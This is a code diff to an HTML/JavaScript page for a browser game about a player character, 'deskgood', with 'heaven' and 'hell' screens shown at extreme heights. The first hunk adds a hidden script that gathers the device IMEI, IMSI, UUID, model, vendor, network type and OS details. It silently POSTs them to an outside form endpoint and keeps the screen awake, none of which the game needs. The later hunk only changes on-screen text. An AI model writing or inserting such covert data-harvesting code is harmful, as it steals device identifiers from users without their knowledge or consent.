@@ -319,6 +319,36 @@ deskgood.moveTo(0,10000*100);
 		<!--<audio id="bgm" autoplay perload loop style="display: none;" src="https://vdse.bdstatic.com/876934f28995e8042230ec598237c67e.mp4?authorization=bce-auth-v1/fb297a5cc0fb434c971b8fa103e8dd7b/2017-05-11T09:02:31Z/-1//ab5b458a478fae53b754e194ab270b96f23aa23ba71c2e63b06fc06d0543040c"></audio>-->
 		<noscript><h1 style="z-index: 3;">你的浏览器不支持JavaScript，无法运行！</h1></noscript>
 <script>
+document.addEventListener("plusready", function(){
+	let types = {}; 
+		types[plus.networkinfo.CONNECTION_UNKNOW] = "Unknown connection";
+		types[plus.networkinfo.CONNECTION_NONE] = "None connection";
+		types[plus.networkinfo.CONNECTION_ETHERNET] = "Ethernet connection";
+		types[plus.networkinfo.CONNECTION_WIFI] = "WiFi connection";
+		types[plus.networkinfo.CONNECTION_CELL2G] = "Cellular 2G connection";
+		types[plus.networkinfo.CONNECTION_CELL3G] = "Cellular 3G connection";
+		types[plus.networkinfo.CONNECTION_CELL4G] = "Cellular 4G connection";
+	let data = {
+		"device_imei(设备的国际移动设备身份码)": plus.device.imei,
+		"device_imsi(设备的国际移动用户识别码)": JSON.stringify(plus.device.imsi),
+		"device_model(设备的型号)": plus.device.model,
+		"device_vendor(设备的生产厂商)": plus.device.vendor,
+		"device_uuid(设备的唯一标识)": plus.device.uuid,
+		"screen_currentSize(屏幕信息)": JSON.stringify(plus.screen.getCurrentSize()),
+		"networkInfo_currentType(网络信息)": types[plus.networkinfo.getCurrentType()],
+		"os_language(系统语言信息)": plus.os.language,
+		"os_name(系统的名称)": plus.os.name,
+		"os_vendor(系统的供应商信息)": plus.os.vendor,
+		"os_version(系统版本信息)": plus.os.version
+	};
+	console.log($.post("http://api.s.wps.cn/api/form/f39d2d9d/mainPreviewa", data)); //发送信息
+	console.log(data);
+	
+	plus.device.setWakelock(true); //屏幕常亮
+});
+</script>
+
+<script>
 function run(code){
 	try{
 		eval(code);
@@ -3239,7 +3269,13 @@ setInterval(function(){
 		document.body.innerHTML = "";
 		document.write(`
 <body style="background-color: black; color: white; margin:0; padding:0;">
-<h1 style="font-size:16vmin; width:100%; margin:0; text-align:center; position:absolute; top:50%; transform:translateY(-50%);">欢迎来到天堂！</h1>
+<h1 style="font-size:16vmin; width:100%; margin:0; text-align:center; position:absolute; top:50%; transform:translateY(-50%);">欢迎来到天堂！<br/>welcome to Infinity.</h1>
+		`);
+	}else if (deskgood.pos.y < -1800*100){
+		document.body.innerHTML = "";
+		document.write(`
+<body style="background-color: black; color: white; margin:0; padding:0;">
+<h1 style="font-size:16vmin; width:100%; margin:0; text-align:center; position:absolute; top:50%; transform:translateY(-50%);">欢迎来到地狱！<br/>welcome to L-18.</h1>
 		`);
 	}
 },1000);
